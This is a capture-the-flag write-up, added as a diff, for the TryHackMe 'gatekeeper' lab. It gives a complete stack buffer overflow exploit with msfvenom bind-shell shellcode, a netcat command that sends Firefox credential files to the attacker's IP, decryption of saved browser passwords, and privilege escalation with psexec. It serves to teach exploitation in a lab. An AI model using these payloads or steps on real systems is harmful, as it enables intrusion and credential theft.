@@ -1,0 +1,593 @@
+## Challenge name: gatekeeper
+
+
+<img width="1158" height="188" alt="image" src="https://github.com/user-attachments/assets/a7eb785c-b558-4fbc-bd2f-270e275bab6a" />
+<br>
+<br>
+
+```Room Link:``` [https://tryhackme.com/room/gatekeeper](https://tryhackme.com/room/gatekeeper)
+<br>
+<br>
+
+**Let's start by doing recon on target.**
+<br><br>
+**Port Scanning:** ``` nmap -p- -sSVC 10.49.131.120 -oN sr -v ```
+
+```
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+31337/tcp open  Elite
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49162/tcp open  unknown
+49166/tcp open  unknown
+49167/tcp open  unknown
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+31337/tcp open  Elite
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49162/tcp open  msrpc        Microsoft Windows RPC
+49166/tcp open  msrpc        Microsoft Windows RPC
+49167/tcp open  msrpc        Microsoft Windows RPC
+```
+
+**Seems like windows ad env to me lets enumurate smb first**
+
+```
+skid@TheGreen:~/ctfs$ nxc smb 10.49.131.120
+SMB         10.49.131.120   445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True) (Null Auth:True)
+skid@TheGreen:~/ctfs$ smbclient -L //10.49.131.120/ -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Users           Disk
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.49.131.120 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+skid@TheGreen:~/ctfs$ smbclient //10.49.131.120/Users -N
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Fri May 15 07:42:08 2020
+  ..                                 DR        0  Fri May 15 07:42:08 2020
+  Default                           DHR        0  Tue Jul 14 12:52:31 2009
+  desktop.ini                       AHS      174  Tue Jul 14 10:39:24 2009
+  Share                               D        0  Fri May 15 07:43:07 2020
+
+                7863807 blocks of size 4096. 3974510 blocks available
+smb: \> cd Share\
+smb: \Share\> dir
+  .                                   D        0  Fri May 15 07:43:07 2020
+  ..                                  D        0  Fri May 15 07:43:07 2020
+  gatekeeper.exe                      A    13312  Mon Apr 20 11:12:17 2020
+
+                7863807 blocks of size 4096. 3974510 blocks available
+smb: \Share\> get gatekeeper.exe
+getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (27.8 KiloBytes/sec) (average 27.8 KiloBytes/sec)
+smb: \Share\> quit
+skid@TheGreen:~/ctfs$ ls gatekeeper.exe
+gatekeeper.exe
+skid@TheGreen:~/ctfs$
+```
+
+**Alright I found a executable in there and I had no idea what to with it so I just ran it.**
+
+```
+skid@TheGreen:~/ctfs$ ls
+gatekeeper.exe  pwn.sh  runNotepad.sh  sr
+skid@TheGreen:~/ctfs$ powershell.exe
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali-linux\home\skid\ctfs> .\gatekeeper.exe
+[+] Listening for connections.
+```
+
+**Let's check for port it is listening on..**
+
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali-linux\home\skid\ctfs> Get-NetTCPConnection -State Listen | Sort-Object LocalPort | Format-Table -AutoSize
+LocalAddress LocalPort RemoteAddress RemotePort State  AppliedSetting OwningProcess
+------------ --------- ------------- ---------- -----  -------------- -------------
+---
+snip
+---
+0.0.0.0      31337     0.0.0.0       0          Listen                21956   # searched using process id..
+---
+snip
+---
+```
+
+**Found out its listening on port 31337 and used nc to connect and this is how it works..**
+
+<img width="1388" height="597" alt="image" src="https://github.com/user-attachments/assets/00d67e09-cb99-4a05-859a-6ed483b273f6" />
+<br>
+<br>
+
+**After that I checked nmap scan result to check if same port is open there and it was `31337/tcp open  Elite?` and idk what this elite is let's connect to it.**
+
+```
+skid@TheGreen:~/ctfs$ nc -v 10.49.131.120 31337
+10.49.131.120 [10.49.131.120] 31337 (?) open
+yo
+Hello yo!!!
+```
+
+**Alright its the same so I am sure that I now have to find some place in binary where there is buffer overflow or some kinda thing that will let our input -> rce..**
+**So, fired up ghidra and found something juicy..**
+
+<img width="1668" height="912" alt="image" src="https://github.com/user-attachments/assets/dcebc265-5e61-43ca-830b-68c6e8dc4c69" />
+<br>
+<br>
+
+**As we can see there `FUN_08041100(&local_98,s_Hello_%s!!!_080441f0);` what it does is it takes hello and input that addr like thing is where input given by user comes and goes to local_98 which has 127 bytes space reserved but it can take any amount of data in this var cuz its not taking any fixed site size simply converting it in c becomes `sprintf(local_98, "Hello %s!!!", input);` so its saving hello and user input in var local-98. The sprintf function takes any size of data unlike snprintf and otehrs which takes sizeof() it is built like that to take any size of data so we can give any amount of data to it this function developer musn't have given user input data to sprintf lol.. good so just discovered buffer overflow vuln in this executable.. Now let's enum further..**
+
+<img width="2209" height="1296" alt="image" src="https://github.com/user-attachments/assets/899862d7-106c-4743-8408-8754c20acc54" />
+<br>
+<br>
+
+**What I jsut did in the image shown up there is I simply copied the addr of the place where the function starts and gone there in xdbg because we can do dynamic analysis there.. use ctrl+g and then paste the copied address of the function you jsut saw that function earlier in ss of ghidra decompiled view and paste it in xdbg and hit enter it will take you at push ebp - in asm it is start of a function means we are in correct place. So put a bp(breakpoint) in there and let's understand the concept what we are gonna do next..**
+
+```
+When FUN_080416f0 is called:
+   call  -> pushes the ret addr onto the stack
+
+buffer flows towards higher addr/upwards and stack towards lower add/downward
+
+   higher addr ┌────────────────────┐
+               │  saved RET (EIP)   │  <- ret pops THIS into EIP
+               ├────────────────────┤
+               │  saved EBP         │
+               ├────────────────────┤
+               │  ... locals ...    │
+               │  auStack_97[127]   │
+   lower addr  │  local_98  (buf)   │  <- sprintf starts writing HERE, overflows upward
+```
+
+**We are inside of a function so think of how we can get a rce sending sus input.. So 127 bytes is reserved for the var to hold input more then that that will go upward and fill other local variables and eventually EBP and EIP register and this is important to understand because EIP register holds the address to return to.. if we change where we want to return and return somewhere else.. but where.. now there comes another register called ESP it happens to point right at the bytes you sent after the return address. So we can make the function return there and then run our code. Sounds cool so let's begin..**
+
+```
+# Generate pattern
+msf-pattern_create -l 300
+
+# Send it to the service
+python3 -c "print('Aa0Aa1Aa2...')" | nc -v TARGET_VM_IP 31337
+```
+
+**We are generating pattern so we can identify by how many bytes we can reach EBP register. gatekeeper.exe is running inside xdbg or is debugger attached and its in running condition and also put a breakpoint at the place where function ends/returns.. the ret instruction. See the initial look how it looks like.. (make sure executable is in running condition sayin listening for connections)**
+
+<img width="2445" height="1574" alt="image" src="https://github.com/user-attachments/assets/73242bce-68b9-4580-a04f-255d0d643b5c" />
+<br>
+<br>
+
+```
+skid@TheGreen:~/ctfs$ nc -v 192.168.1.28 31337  # connecting to vm..
+192.168.1.28 [192.168.1.28] 31337 (?) open 
+^C
+skid@TheGreen:~/ctfs$ msf-pattern_create -l 300
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+skid@TheGreen:~/ctfs$  msf-pattern_create -l 300 |  nc -v 192.168.1.28 31337
+192.168.1.28 [192.168.1.28] 31337 (?) open
+
+```
+
+<img width="2375" height="1283" alt="image" src="https://github.com/user-attachments/assets/7ad27fc2-6988-4c74-9ee8-caff215fe1cb" />
+<br>
+<br>
+
+**After entering it we can see in vm again it hits our first breakpoint which is at start of function run once to reach return click f9 or that run button on top left 4th position -> aerro symbol alr..**
+
+<img width="2489" height="1181" alt="image" src="https://github.com/user-attachments/assets/62629938-ca44-4ae3-9988-817f643b2666" />
+<br>
+<br>
+
+**Look at EBP register its value is 65413765 which begins after 142 bytes and after that 4 bytes is EBP and 4 bytes after EBP is EIP. HOw do i know EIP starts after 146 bytes. How we calculated 142 is bellow used that same tool but the logic is which byte is showing there in EBP from our input and calculating from the string we passed at what byte it is like that..**
+
+```
+skid@TheGreen:~$ msf-pattern_offset -q 65413765
+[*] Exact match at offset 142
+skid@TheGreen:~$
+```
+
+**Now that we know these we can change where function returns we will make it go to `jmp esp` to execute our data so lets find the addr of it so in order to do that use xdbg command line and run this `findallmem 0, "FFE4", -1, module` and see output in refrences tab.**
+
+<img width="2458" height="1288" alt="image" src="https://github.com/user-attachments/assets/bd6be7df-8794-45b6-996a-ef437add8575" />
+<br>
+<br>
+
+**There comes 6 - 7 results**
+
+<img width="1470" height="1438" alt="image" src="https://github.com/user-attachments/assets/0cd782ea-04e9-42ed-aa86-a59550187944" />
+<br>
+
+**But we are only gona use the addr that starts with addr 080.... cuz our function is around this range and there are 2. Lets use first one first - 080414C3 and test it, We will put this in return addr and then it returns to jmp esp and this esp we will find out it this is the one which jumps to our data.**
+
+```
+skid@TheGreen:~/ctfs$ msfvenom -p windows/exec CMD=notepad.exe EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v sc
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 223 (iteration=0)
+x86/shikata_ga_nai chosen with final size 223
+Payload size: 223 bytes
+Final size of python file: 1092 bytes
+sc =  b""
+sc += b"\xdd\xc1\xbf\xa1\xb0\x34\xb2\xd9\x74\x24\xf4\x5d"
+sc += b"\x2b\xc9\xb1\x32\x31\x7d\x17\x83\xed\xfc\x03\xdc"
+sc += b"\xa3\xd6\x47\xe2\x2c\x94\xa8\x1a\xad\xf9\x21\xff"
+sc += b"\x9c\x39\x55\x74\x8e\x89\x1d\xd8\x23\x61\x73\xc8"
+sc += b"\xb0\x07\x5c\xff\x71\xad\xba\xce\x82\x9e\xff\x51"
+sc += b"\x01\xdd\xd3\xb1\x38\x2e\x26\xb0\x7d\x53\xcb\xe0"
+sc += b"\xd6\x1f\x7e\x14\x52\x55\x43\x9f\x28\x7b\xc3\x7c"
+sc += b"\xf8\x7a\xe2\xd3\x72\x25\x24\xd2\x57\x5d\x6d\xcc"
+sc += b"\xb4\x58\x27\x67\x0e\x16\xb6\xa1\x5e\xd7\x15\x8c"
+sc += b"\x6e\x2a\x67\xc9\x49\xd5\x12\x23\xaa\x68\x25\xf0"
+sc += b"\xd0\xb6\xa0\xe2\x73\x3c\x12\xce\x82\x91\xc5\x85"
+sc += b"\x89\x5e\x81\xc1\x8d\x61\x46\x7a\xa9\xea\x69\xac"
+sc += b"\x3b\xa8\x4d\x68\x67\x6a\xef\x29\xcd\xdd\x10\x29"
+sc += b"\xae\x82\xb4\x22\x43\xd6\xc4\x69\x0e\x29\x5a\x14"
+sc += b"\x7c\x29\x64\x16\xd1\x42\x55\x9d\xbe\x15\x6a\x74"
+sc += b"\xfb\x81\x4e\x47\x0c\xdd\xd6\x32\x51\x83\xe8\xe9"
+sc += b"\x96\xba\x6a\x1b\x67\x39\x72\x6e\x62\x05\x34\x83"
+sc += b"\x1e\x16\xd1\xa3\x8d\x17\xf0\xcd\x5e\x9c\x9e\x61"
+sc += b"\xc0\x38\x4f\xe4\x7a\xa4\x8f"
+skid@TheGreen:~/ctfs$
+```
+
+**This will be our data/simple payload for now generated using msf venom to open notepad.exe and we are using thread to run it cuz it must not fuk the gatekeeper process and also doing bad chars escape, Now let's craft the payload..**
+
+```
+python3 -c '
+import sys, struct
+
+sc =  b""
+sc += b"\xdd\xc1\xbf\xa1\xb0\x34\xb2\xd9\x74\x24\xf4\x5d"
+sc += b"\x2b\xc9\xb1\x32\x31\x7d\x17\x83\xed\xfc\x03\xdc"
+sc += b"\xa3\xd6\x47\xe2\x2c\x94\xa8\x1a\xad\xf9\x21\xff"
+sc += b"\x9c\x39\x55\x74\x8e\x89\x1d\xd8\x23\x61\x73\xc8"
+sc += b"\xb0\x07\x5c\xff\x71\xad\xba\xce\x82\x9e\xff\x51"
+sc += b"\x01\xdd\xd3\xb1\x38\x2e\x26\xb0\x7d\x53\xcb\xe0"
+sc += b"\xd6\x1f\x7e\x14\x52\x55\x43\x9f\x28\x7b\xc3\x7c"
+sc += b"\xf8\x7a\xe2\xd3\x72\x25\x24\xd2\x57\x5d\x6d\xcc"
+sc += b"\xb4\x58\x27\x67\x0e\x16\xb6\xa1\x5e\xd7\x15\x8c"
+sc += b"\x6e\x2a\x67\xc9\x49\xd5\x12\x23\xaa\x68\x25\xf0"
+sc += b"\xd0\xb6\xa0\xe2\x73\x3c\x12\xce\x82\x91\xc5\x85"
+sc += b"\x89\x5e\x81\xc1\x8d\x61\x46\x7a\xa9\xea\x69\xac"
+sc += b"\x3b\xa8\x4d\x68\x67\x6a\xef\x29\xcd\xdd\x10\x29"
+sc += b"\xae\x82\xb4\x22\x43\xd6\xc4\x69\x0e\x29\x5a\x14"
+sc += b"\x7c\x29\x64\x16\xd1\x42\x55\x9d\xbe\x15\x6a\x74"
+sc += b"\xfb\x81\x4e\x47\x0c\xdd\xd6\x32\x51\x83\xe8\xe9"
+sc += b"\x96\xba\x6a\x1b\x67\x39\x72\x6e\x62\x05\x34\x83"
+sc += b"\x1e\x16\xd1\xa3\x8d\x17\xf0\xcd\x5e\x9c\x9e\x61"
+sc += b"\xc0\x38\x4f\xe4\x7a\xa4\x8f"
+
+p  = b"A"*146 + struct.pack("<I", 0x080414C3) + b"\x90"*16 + sc + b"\n"
+sys.stdout.buffer.write(p)
+' | nc -v 192.168.1.28 31337
+```
+
+**This code sends 146 As to reach the overwrite point then writes the address in little endian. After that it adds some 90's (nop) padding and the payload bytes/data after that followed by \n because the input is being sent through a socket and \n is enter for socket/terminals which will send our data. Let's see it in action..**
+
+<img width="2446" height="1295" alt="image" src="https://github.com/user-attachments/assets/0d62a042-11bf-4cba-b732-f84edd4956cb" />
+<br>
+<br>
+
+**Alright.. It was a successs. So now lets make bind shell payload using msfvenom and bind shell cuz exe is sending us request not receiving so lets cont..**
+
+```
+skid@TheGreen:~/ctfs$ msfvenom -p windows/shell_bind_tcp LPORT=1337 EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v sc
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 355 (iteration=0)
+x86/shikata_ga_nai chosen with final size 355
+Payload size: 355 bytes
+Final size of python file: 1730 bytes
+sc =  b""
+sc += b"\xbb\x0f\xd3\x6c\x44\xdd\xc3\xd9\x74\x24\xf4\x5d"
+sc += b"\x2b\xc9\xb1\x53\x31\x5d\x12\x83\xc5\x04\x03\x52"
+sc += b"\xdd\x8e\xb1\x90\x09\xcc\x3a\x68\xca\xb1\xb3\x8d"
+sc += b"\xfb\xf1\xa0\xc6\xac\xc1\xa3\x8a\x40\xa9\xe6\x3e"
+sc += b"\xd2\xdf\x2e\x31\x53\x55\x09\x7c\x64\xc6\x69\x1f"
+sc += b"\xe6\x15\xbe\xff\xd7\xd5\xb3\xfe\x10\x0b\x39\x52"
+sc += b"\xc8\x47\xec\x42\x7d\x1d\x2d\xe9\xcd\xb3\x35\x0e"
+sc += b"\x85\xb2\x14\x81\x9d\xec\xb6\x20\x71\x85\xfe\x3a"
+sc += b"\x96\xa0\x49\xb1\x6c\x5e\x48\x13\xbd\x9f\xe7\x5a"
+sc += b"\x71\x52\xf9\x9b\xb6\x8d\x8c\xd5\xc4\x30\x97\x22"
+sc += b"\xb6\xee\x12\xb0\x10\x64\x84\x1c\xa0\xa9\x53\xd7"
+sc += b"\xae\x06\x17\xbf\xb2\x99\xf4\xb4\xcf\x12\xfb\x1a"
+sc += b"\x46\x60\xd8\xbe\x02\x32\x41\xe7\xee\x95\x7e\xf7"
+sc += b"\x50\x49\xdb\x7c\x7c\x9e\x56\xdf\xe9\x53\x5b\xdf"
+sc += b"\xe9\xfb\xec\xac\xdb\xa4\x46\x3a\x50\x2c\x41\xbd"
+sc += b"\x97\x07\x35\x51\x66\xa8\x46\x78\xad\xfc\x16\x12"
+sc += b"\x04\x7d\xfd\xe2\xa9\xa8\x68\xea\x0c\x03\x8f\x17"
+sc += b"\xee\xf3\x0f\xb7\x87\x19\x80\xe8\xb8\x21\x4a\x81"
+sc += b"\x51\xdc\x75\xa8\x98\x69\x93\xd8\xca\x3f\x0b\x74"
+sc += b"\x29\x64\x84\xe3\x52\x4e\xbc\x83\x1b\x98\x7b\xac"
+sc += b"\x9b\x8e\x2b\x3a\x10\xdd\xef\x5b\x27\xc8\x47\x0c"
+sc += b"\xb0\x86\x09\x7f\x20\x96\x03\x17\xc1\x05\xc8\xe7"
+sc += b"\x8c\x35\x47\xb0\xd9\x88\x9e\x54\xf4\xb3\x08\x4a"
+sc += b"\x05\x25\x72\xce\xd2\x96\x7d\xcf\x97\xa3\x59\xdf"
+sc += b"\x61\x2b\xe6\x8b\x3d\x7a\xb0\x65\xf8\xd4\x72\xdf"
+sc += b"\x52\x8a\xdc\xb7\x23\xe0\xde\xc1\x2b\x2d\xa9\x2d"
+sc += b"\x9d\x98\xec\x52\x12\x4d\xf9\x2b\x4e\xed\x06\xe6"
+sc += b"\xca\x76\x23\x39\xdd\xe1\x72\xac\xa0\x6f\x85\x1b"
+sc += b"\xe6\x89\x06\xa9\x97\x6d\x16\xd8\x92\x2a\x90\x31"
+sc += b"\xef\x23\x75\x35\x5c\x43\x5c"
+skid@TheGreen:~/ctfs$
+```
+
+**Passing it to server exe will land us a shell of that windows machine and we can get our user flag in desktop directory. Anyway shown bellow:**
+
+```
+skid@TheGreen:~/ctfs$
+skid@TheGreen:~/ctfs$ python3 -c '
+import sys, struct
+
+sc =  b""
+sc += b"\xbb\x0f\xd3\x6c\x44\xdd\xc3\xd9\x74\x24\xf4\x5d"
+sc += b"\x2b\xc9\xb1\x53\x31\x5d\x12\x83\xc5\x04\x03\x52"
+sc += b"\xdd\x8e\xb1\x90\x09\xcc\x3a\x68\xca\xb1\xb3\x8d"
+sc += b"\xfb\xf1\xa0\xc6\xac\xc1\xa3\x8a\x40\xa9\xe6\x3e"
+sc += b"\xd2\xdf\x2e\x31\x53\x55\x09\x7c\x64\xc6\x69\x1f"
+sc += b"\xe6\x15\xbe\xff\xd7\xd5\xb3\xfe\x10\x0b\x39\x52"
+sc += b"\xc8\x47\xec\x42\x7d\x1d\x2d\xe9\xcd\xb3\x35\x0e"
+sc += b"\x85\xb2\x14\x81\x9d\xec\xb6\x20\x71\x85\xfe\x3a"
+sc += b"\x96\xa0\x49\xb1\x6c\x5e\x48\x13\xbd\x9f\xe7\x5a"
+sc += b"\x71\x52\xf9\x9b\xb6\x8d\x8c\xd5\xc4\x30\x97\x22"
+sc += b"\xb6\xee\x12\xb0\x10\x64\x84\x1c\xa0\xa9\x53\xd7"
+sc += b"\xae\x06\x17\xbf\xb2\x99\xf4\xb4\xcf\x12\xfb\x1a"
+sc += b"\x46\x60\xd8\xbe\x02\x32\x41\xe7\xee\x95\x7e\xf7"
+sc += b"\x50\x49\xdb\x7c\x7c\x9e\x56\xdf\xe9\x53\x5b\xdf"
+sc += b"\xe9\xfb\xec\xac\xdb\xa4\x46\x3a\x50\x2c\x41\xbd"
+sc += b"\x97\x07\x35\x51\x66\xa8\x46\x78\xad\xfc\x16\x12"
+sc += b"\x04\x7d\xfd\xe2\xa9\xa8\x68\xea\x0c\x03\x8f\x17"
+sc += b"\xee\xf3\x0f\xb7\x87\x19\x80\xe8\xb8\x21\x4a\x81"
+sc += b"\x51\xdc\x75\xa8\x98\x69\x93\xd8\xca\x3f\x0b\x74"
+sc += b"\x29\x64\x84\xe3\x52\x4e\xbc\x83\x1b\x98\x7b\xac"
+sc += b"\x9b\x8e\x2b\x3a\x10\xdd\xef\x5b\x27\xc8\x47\x0c"
+sc += b"\xb0\x86\x09\x7f\x20\x96\x03\x17\xc1\x05\xc8\xe7"
+sc += b"\x8c\x35\x47\xb0\xd9\x88\x9e\x54\xf4\xb3\x08\x4a"
+sc += b"\x05\x25\x72\xce\xd2\x96\x7d\xcf\x97\xa3\x59\xdf"
+sc += b"\x61\x2b\xe6\x8b\x3d\x7a\xb0\x65\xf8\xd4\x72\xdf"
+sc += b"\x52\x8a\xdc\xb7\x23\xe0\xde\xc1\x2b\x2d\xa9\x2d"
+sc += b"\x9d\x98\xec\x52\x12\x4d\xf9\x2b\x4e\xed\x06\xe6"
+sc += b"\xca\x76\x23\x39\xdd\xe1\x72\xac\xa0\x6f\x85\x1b"
+sc += b"\xe6\x89\x06\xa9\x97\x6d\x16\xd8\x92\x2a\x90\x31"
+sc += b"\xef\x23\x75\x35\x5c\x43\x5c"
+
+p  = b"A"*146 + struct.pack("<I", 0x080414C3) + b"\x90"*16 + sc + b"\n"
+sys.stdout.buffer.write(p)
+' | nc -v 10.49.131.120 31337
+10.49.131.120 [10.49.131.120] 31337 (?) open
+```
+
+**After running it wait few seconds let server open that port for you and then listen using `nc -nv MACHINE_IP 1337`**
+
+```
+skid@TheGreen:~/ctfs$ nc -nv 10.49.131.120 1337
+(UNKNOWN) [10.49.131.120] 1337 (?) open
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\natbat\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\Desktop
+
+05/14/2020  09:24 PM    <DIR>          .
+05/14/2020  09:24 PM    <DIR>          ..
+04/21/2020  05:00 PM             1,197 Firefox.lnk
+04/20/2020  01:27 AM            13,312 gatekeeper.exe
+04/21/2020  09:53 PM               135 gatekeeperstart.bat
+05/14/2020  09:43 PM               140 user.txt.txt
+               4 File(s)         14,784 bytes
+               2 Dir(s)  16,388,685,824 bytes free
+
+C:\Users\natbat\Desktop>type user.txt.txt
+type user.txt.txt
+{H4lf_W4y_Th3r3}
+
+The buffer overflow in this room is credited to Justin Steven and his
+"dostackbufferoverflowgood" program.  Thank you!
+C:\Users\natbat\Desktop>
+```
+
+**Now the priv esc part after roaming arround in windows machine for a bit found something.. if we returned back to the desktop files we will notice firefox.lnk**
+
+```
+C:\Users\natbat\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\Desktop
+
+05/14/2020  09:24 PM    <DIR>          .
+05/14/2020  09:24 PM    <DIR>          ..
+04/21/2020  05:00 PM             1,197 Firefox.lnk
+04/20/2020  01:27 AM            13,312 gatekeeper.exe
+04/21/2020  09:53 PM               135 gatekeeperstart.bat
+05/14/2020  09:43 PM               140 user.txt.txt
+               4 File(s)         14,784 bytes
+               2 Dir(s)  16,388,685,824 bytes free
+
+C:\Users\natbat\Desktop>cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\
+cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\
+
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles
+
+04/21/2020  05:00 PM    <DIR>          .
+04/21/2020  05:00 PM    <DIR>          ..
+05/14/2020  10:45 PM    <DIR>          ljfn812a.default-release
+04/21/2020  05:00 PM    <DIR>          rajfzh3y.default
+               0 File(s)              0 bytes
+               4 Dir(s)  16,388,685,824 bytes free
+
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>cd ljfn812a.default-release
+cd ljfn812a.default-release
+
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+
+05/14/2020  10:45 PM    <DIR>          .
+05/14/2020  10:45 PM    <DIR>          ..
+05/14/2020  10:30 PM                24 addons.json
+05/14/2020  10:23 PM             1,952 addonStartup.json.lz4
+05/14/2020  10:45 PM                 0 AlternateServices.txt
+05/14/2020  10:30 PM    <DIR>          bookmarkbackups
+05/14/2020  10:24 PM               216 broadcast-listeners.json
+04/22/2020  12:47 AM           229,376 cert9.db
+04/21/2020  05:00 PM               220 compatibility.ini
+04/21/2020  05:00 PM               939 containers.json
+04/21/2020  05:00 PM           229,376 content-prefs.sqlite
+05/14/2020  10:45 PM           524,288 cookies.sqlite
+05/14/2020  10:24 PM    <DIR>          crashes
+05/14/2020  10:45 PM    <DIR>          datareporting
+04/21/2020  05:00 PM             1,111 extension-preferences.json
+04/21/2020  05:00 PM    <DIR>          extensions
+05/14/2020  10:34 PM            39,565 extensions.json
+05/14/2020  10:45 PM         5,242,880 favicons.sqlite
+05/14/2020  10:39 PM           196,608 formhistory.sqlite
+04/21/2020  10:50 PM    <DIR>          gmp-gmpopenh264
+04/21/2020  10:50 PM    <DIR>          gmp-widevinecdm
+04/21/2020  05:00 PM               540 handlers.json
+04/21/2020  05:02 PM           294,912 key4.db
+05/14/2020  10:43 PM               600 logins.json
+04/21/2020  05:00 PM    <DIR>          minidumps
+05/14/2020  10:23 PM                 0 parent.lock
+05/14/2020  10:25 PM            98,304 permissions.sqlite
+04/21/2020  05:00 PM               506 pkcs11.txt
+05/14/2020  10:45 PM         5,242,880 places.sqlite
+05/14/2020  10:45 PM            11,096 prefs.js
+05/14/2020  10:45 PM            65,536 protections.sqlite
+05/14/2020  10:45 PM    <DIR>          saved-telemetry-pings
+05/14/2020  10:23 PM             2,715 search.json.mozlz4
+05/14/2020  10:45 PM                 0 SecurityPreloadState.txt
+04/21/2020  10:50 PM    <DIR>          security_state
+05/14/2020  10:45 PM               288 sessionCheckpoints.json
+05/14/2020  10:45 PM    <DIR>          sessionstore-backups
+05/14/2020  10:45 PM            12,889 sessionstore.jsonlz4
+04/21/2020  05:00 PM                18 shield-preference-experiments.json
+05/14/2020  10:45 PM             1,357 SiteSecurityServiceState.txt
+04/21/2020  05:00 PM    <DIR>          storage
+05/14/2020  10:45 PM             4,096 storage.sqlite
+04/21/2020  05:00 PM                50 times.json
+05/14/2020  10:45 PM                 0 TRRBlacklist.txt
+04/21/2020  05:00 PM    <DIR>          weave
+04/21/2020  05:02 PM            98,304 webappsstore.sqlite
+05/14/2020  10:45 PM               140 xulstore.json
+              33 File(s)     12,300,786 bytes
+              14 Dir(s)  16,388,395,008 bytes free
+
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>
+```
+
+**if you notice there is a directory called ljfn812a.default-release serach about on google you will find this folder save the browser logins let's see what this folder content.. ther is an important files that maight be contain logins key4.db and logins.json. for Retrieving the passwords from those files there a good python script for that, read**
+<br>
+
+**now we have netcat in the windows target, let’s use it on our shell for get key4.db and logins.json after that clone the following repo**
+
+```
+# get like this settign up nc
+nc.exe -nv 10.9.3.214 1234 < logins.json
+#clone this repo..
+git clone https://github.com/lclevy/firepwd.git
+```
+
+**do the same with key4.db file. now we have thowse two files we can retrieve all possible credentials from them to escalate our privilege.**
+
+**now move them to firepwd/**
+```
+mv logins.json firepwd/
+mv key4.db firepwd/
+```
+
+**let’s get thowse fucking credentials using firepwd script**
+
+```
+cd firepwd/
+pip install -r requirements.txt
+python3 firepwd.py
+
+clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
+decrypting login/password pairs
+   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
+```
+
+**xcellent, now we have some creds, let’s use them with psexec PSExec: This tool can execute any command on the remote system, including interactive commands such as cmd.exe or powershell.exe**
+
+```
+skid@TheGreen:~/ctfs$ python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.49.131.120 cmd.exe
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on 10.49.131.120.....
+[*] Found writable share ADMIN$
+[*] Uploading file KIHVqcKl.exe
+[*] Opening SVCManager on 10.49.131.120.....
+[*] Creating service SlGm on 10.49.131.120.....
+[*] Starting service SlGm.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
